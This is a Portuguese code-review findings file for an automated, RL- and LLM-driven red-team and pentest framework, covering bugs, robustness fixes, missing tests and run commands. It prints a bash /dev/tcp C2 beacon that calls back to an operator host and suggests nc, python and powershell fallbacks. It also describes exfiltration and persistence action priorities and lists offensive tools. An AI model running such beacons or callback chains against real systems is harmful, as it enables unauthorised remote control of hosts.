# Findings de Nível de Código — Ação Direta

**Base:** Leitura completa dos arquivos-fonte do `red-MPPO-testing_model/` e `bridge/` + `ruadan/`

---

## 1. CORREÇÕES IMEDIATAS (Bugs/Inconsistências)

### 1.1 `agent.py` — Warning de máscaras só loga uma vez
```python
# Linha 165
self._masks_missing_warned = False

# Linhas 452-459
if not self._masks_missing_warned:
    self._masks_missing_warned = True
    _log_warning_event(...)
```
**Problema:** Em treino longo (100k+ updates), warning some após 1ª ocorrência.
**Fix:** Contador + log periódico (ex: a cada 1000 updates) ou `logging.warning` sem guard.

### 1.2 `agent.py` — Reshape `obs_all` sintetiza dados em development
```python
# Linhas 463-482
if obs_all.ndim == 2:
    obs_all = obs_all[:, np.newaxis, :]  # (B, D) -> (B, 1, D)
if obs_all.shape[1] != N:
    if obs_all.shape[1] == 1:
        if confirmatorio:
            raise ValueError(...)
        obs_all = np.repeat(obs_all, N, axis=1)  # SINTETIZA!
```
**Risco:** Gradiente sobre `N` cópias idênticas ≠ gradiente real de `N` agentes.
**Fix:** Em `development`, log warning + shape real; em `confirmatory` já falha (correto).

### 1.3 `zeroday_hunt.py` — Regex de evidência rejeita arquivos sem extensão
```python
# Linha 731
ev_path = re.compile(r"[\w.\-]+(/[\w.\-]+)+\.(json|txt|log|xml)$")
```
**Problema:** Evidência bruta (ex: `step005_llm_hunt/raw_output`) sem extensão → `confirmed` rebaixado para `suspect`.
**Fix:** Aceitar qualquer path sob `evidence/`:
```python
ev_path = re.compile(r"evidence/[\w./\-]+")  # ou verificar existência real
```

### 1.4 `tools.py` — C2 callback só bash `/dev/tcp`
```python
# Linhas 403-404
beacon = (f"timeout 8 bash -c 'exec 3<>/dev/tcp/{src_ip}/{port}; "
          f"echo {token} >&3' 2>/dev/null || true")
```
**Limitação:** Alvos sem bash / `/dev/tcp` desabilitado / Windows → callback falha silenciosamente.
**Fix:** Fallback chain: `bash /dev/tcp` → `nc -w 5` → `python -c "socket..."` → `powershell` (Windows).

### 1.5 `bridge/ai_orchestrator.py` — Heuristic fallback ignora máscaras
```python
# Linhas 375-400
valid_indices = [i for i in range(len(am)) if am[i] > 0 and i != int(RedAction.NOOP)]
# ... priorização hardcoded EXFILTRATE > C2 > PERSIST > ...
```
**Risco:** Se RL indisponível, fallback pode escolher ação **mascarada como inválida** (ex: EXFILTRATE sem canal C2).
**Fix:** Respeitar `am`/`tm` no fallback heurístico ou logar "RL unavailable — using heuristic WITH mask respect".

### 1.6 `bridge/llm_client.py` — Log duplicado em múltiplos diretórios
```python
# Linhas 244-281 _write_log_entry
target_dirs = [...]  # 10+ diretórios hardcoded
for d in target_dirs:
    for fname in ["ollama_interactions.log", "ollama_client.log"]:
        # escreve em TODOS
```
**Problema:** I/O excessivo, logs duplicados, `fsync` em cada chamada.
**Fix:** Configurar **um** log directory via env `RUADAN_OUTPUT_DIR`; remover fallback hardcoded.

---

## 2. MELHORIAS DE ROBUSTEZ

### 2.1 `inventory.py` — Secrets só via `${ENV_VAR}`
```python
# Linhas 21-36
_ENV_SECRET_RE = re.compile(r"^\$\{([A-Za-z_][A-Za-z0-9_]*)\}$")
```
**Bom:** Não permite credenciais hardcoded no YAML.
**Gap:** Não valida se `key_path` aponta para arquivo existente (só resolve `${VAR}`).
**Sugestão:** Adicionar validação opcional `--validate-paths` no CLI.

### 2.2 `zeroday_hunt.py` — `exploit_search` automático sem cache
```python
# Linhas 453-458
for port, banner in hh.products.items():
    if banner and banner != "dry" and "port/" not in str(banner):
        try:
            self.tb.tool_exploit_search(termo=str(banner))
        except Exception:
            pass
```
**Problema:** Mesmo banner em múltiplos hosts/portas → busca repetida.
**Fix:** Cache por `(banner_normalizado)` no `ToolBox` ou `ZeroDayHunter`.

### 2.3 `tools.py` — `run_command` allowlist hardcoded (~45 binários)
```python
# arsenal.py (não lido mas referenciado)
# allowlist deve cobrir: nmap, ffuf, gobuster, redis-cli, smbclient, snmpwalk, hydra, dig, curl, nuclei, sqlmap, searchsploit, ...
```
**Risco:** Binário novo necessário → falha silenciosa "command not allowed".
**Fix:** Log de comando rejeitado + métrica `command_rejected_total`; documentar processo de adição.

### 2.4 `pilot.py` — Subprocess sem timeout global
```python
# Linhas 61, 156
rc = subprocess.run(cmd).returncode  # SEM timeout!
```
**Risco:** Caçada/campanha travada → pilot trava indefinidamente.
**Fix:** `subprocess.run(cmd, timeout=args.wall_clock + 300)` ou usar `self.safety.check_wall_clock()` no loop.

---

## 3. DÉBITO TÉCNICO DOCUMENTADO

| Arquivo | Linha | Comentário no Código | Ação |
|---|---|---|---|
| `agent.py` | 474-478 | `# v1.4.2: Resiliência MARL - Se o motor enviou menos agentes, repetimos a obs (placeholder seguro)` | Em `confirmatory` falha (correto). Em `dev` sintetiza. **Revisar se placeholder seguro é realmente seguro para gradiente.** |
| `agent.py` | 529-541 | `behavior_clone_weights` resize silencioso em `dev` | Já corrigido em `confirmatory` (falha). **OK.** |
| `zeroday_hunt.py` | 303-317 | `hunt_suite_extras` (SQLi auth, túnel CONNECT) — try/except genérico | **Melhorar:** catch specific exceptions, logar qual extra falhou. |
| `tools.py` | 129 | `# ------------------------------------------------------------ tools` | **Organização:** Separar em `tools_infra.py`, `tools_arsenal.py`, `tools_killchain.py` para manutenibilidade. |
| `ai_orchestrator.py` | 67-113 | `_init_rl_engine` tenta 7 endpoints hardcoded | **Configurável:** `RED_MPPO_ENDPOINTS` env var (comma-separated). |
| `action_dispatcher.py` | 215-224 | `DISCOVER_REMOTE` roda Fast TCP + Fast UDP | **Incompleto:** Não roda "Nmap All TCP" (portas altas). Bridge faz isso ANTES do ciclo (linha 149), mas dispatcher não. |

---

## 4. TESTES FALTANDO (Além dos 96/96 atuais)

### 4.1 Contrato de Update (Já 5 testes — adicionar)
```python
# services/red_team/tests/test_update_contract.py
def test_update_next_masks_used_in_bootstrap():
    """next_action_masks/next_target_masks DEVEM ser usadas no bootstrap do target (linha 637-645)"""
    # Setup: next_masks != current_masks
    # Assert: bootstrap usa next_masks (nam_b, nntm_b) não current

def test_update_gat_encoding_in_update():
    """use_gat=True: _encode_obs DEVE ser chamado em cur/next/bc (linhas 594-615)"""
    # Assert: gat.forward chamado 3x por update

def test_update_host_encoder_t_soft_update():
    """use_target_host_encoder=True: host_encoder_t recebe soft update (linhas 775-779)"""
    # Assert: tau aplicado aos params de host_encoder_t
```

### 4.2 Caçador 0-day
```python
# services/pentest/tests/test_zeroday_hunt.py
def test_verify_suspect_promotes_with_proof():
    """verify_suspect: suspect + prova -> confirmed"""
    
def test_verify_suspect_discards_fp():
    """verify_suspect: FP conhecido (SPA, header sem efeito) -> discarded com motivo"""

def test_llm_confirmed_without_evidence_downgraded():
    """_parse_hunt_final: confirmed sem arquivo evidencia -> suspect"""

def test_oob_canary_callback_verified():
    """Canário OOB: token injetado -> listener captura -> finding confirmed"""
```

### 4.3 Atribuição
```python
# services/pentest/tests/test_attribution.py
def test_attribution_reproducible():
    """attribute_run(run_dir) idempotente: mesma saída bit-a-bit"""
    
def test_attribution_llm_decisive_tool():
    """ferramenta decisiva = a que produziu a prova (evidence_level=credential)"""
```

### 4.4 Drift / Held-out
```python
# services/pentest/tests/test_drift.py
def test_drift_w1_psi_per_feature():
    """drift.py: W1/PSI calculado por feature lab vs sim"""

# services/pentest/tests/test_heldout_eval.py
def test_heldout_factorial_2x2():
    """heldout_eval --factorial: separa C-A (novidade) de B-A (shift)"""
```

---

## 5. CHECKLIST DE PRONTO PARA PRODUÇÃO (Definition of Done)

### Por Componente
- [ ] **agent.py**: 96/96 testes + 4 novos de contrato update + benchmark GAT N=50
- [ ] **zeroday_hunt.py**: F0-F4 + verify_suspect + cve_validate + audit_hunt PASS
- [ ] **pilot.py**: P1-P4 end-to-end em VM .110 com `--rounds 20` → PILOT_REPORT.md
- [ ] **tools.py**: Todas tools com canário + evidência SHA256 + allowlist auditada
- [ ] **cve_feed/exploit_search/cve_validate**: Sync 2022-2026 + 10 PoCs inofensivos validados
- [ ] **bridge/**: RL server HTTP + local PyTorch + fallback heurístico (respeita máscaras)
- [ ] **ruadan/**: start.sh + docker-run.sh + locks + /etc/hosts dinâmico + GPU detect

### Por Documento
- [ ] `MANUAL_CACADOR_ZERODAY.md` reflete versão atual (flags, outputs, vereditos)
- [ ] `20260922_rev11_pilot_um_comando.md` documenta PILOT completo
- [ ] `contexto/ANALISE_PLANEJAMENTO_REV8_REV9.md` (este analysis) versionado
- [ ] `contexto/CODE_LEVEL_FINDINGS.md` (este arquivo) versionado

---

## 6. COMANDOS ÚTEIS PARA VALIDAÇÃO RÁPIDA

```bash
# 1. Testes unitários red-MPPO
cd /system/ruadan-new/red-MPPO-testing_model
python -m pytest services/red_team/tests/ services/pentest/tests/ -v --tb=short

# 2. Dry-run caçador (sem LLM, sem rede real)
docker compose -f docker/pentest/docker-compose.yml run --rm --entrypoint python pentest-brain \
    -m services.pentest.app.zeroday_hunt \
    --inventory configs/pentest/inventory.yaml --dry-run --no-llm

# 3. Validação atribuição (recomputável)
docker compose -f docker/pentest/docker-compose.yml run --rm --entrypoint python pentest-brain \
    -m services.pentest.app.attribution --verify /repo/data/pentest_runs/<run>

# 4. Feed CVE sync + index (offline)
docker compose -f docker/pentest/docker-compose.yml run --rm --entrypoint python pentest-brain \
    -m services.pentest.app.cve_feed sync --years 2022-2026
docker compose -f docker/pentest/docker-compose.yml run --rm --entrypoint python pentest-brain \
    -m services.pentest.app.cve_feed index --years 2022-2026

# 5. PILOT completo (requer --i-am-authorized + alvo real)
docker compose -f docker/pentest/docker-compose.yml run --rm --entrypoint python pentest-brain \
    -m services.pentest.app.pilot \
    --inventory /inventory/inventory.yaml --target-ip 192.168.56.110 \
    --checkpoint /checkpoints/maestro_red_ep1246800.pt \
    --i-am-authorized --rounds 16 --max-steps 40 --wall-clock 5400

# 6. Verificar audit_report.json de qualquer run
cat data/pentest_runs/*_zeroday/audit_report.json | jq '.pass, .n_checks, .n_failed'
cat data/pentest_runs/*_pilot/campaign/*/model_r0/audit_report.json | jq '.pass'
```

---

## 7. VARIÁVEIS DE AMBIENTE CRÍTICAS

| Variável | Padrão | Descrição |
|---|---|---|
| `RED_MPPO_URL` | `http://localhost:8000` | Endpoint do RL server (.pt) |
| `CHECKPOINT_PATH` | `/app/checkpoints/maestro_red_ep1246800.pt` | Checkpoint para carregamento local |
| `OLLAMA_API_BASE` | `http://localhost:11434/v1` | Endpoint Ollama (host ou container) |
| `LLM_PROVIDER` | `ollama` | ollama/gemini/openai/anthropic/deepseek/nvidia |
| `LLM_MODEL` | `qwen3:8b` | Modelo específico do provedor |
| `RUADAN_ALLOW_PARALLEL` | `0` | `1` = bypass lock anti-paralelo (perigo!) |
| `RUADAN_OUTPUT_DIR` | `/ruadan/output` | Diretório de saída (logs, evidências) |
| `NVD_API_KEY` | — | Opcional: NVD API 2.0 para cve_feed |

---

*Arquivo: `contexto/CODE_LEVEL_FINDINGS.md` — Para uso direto em PRs/issues.*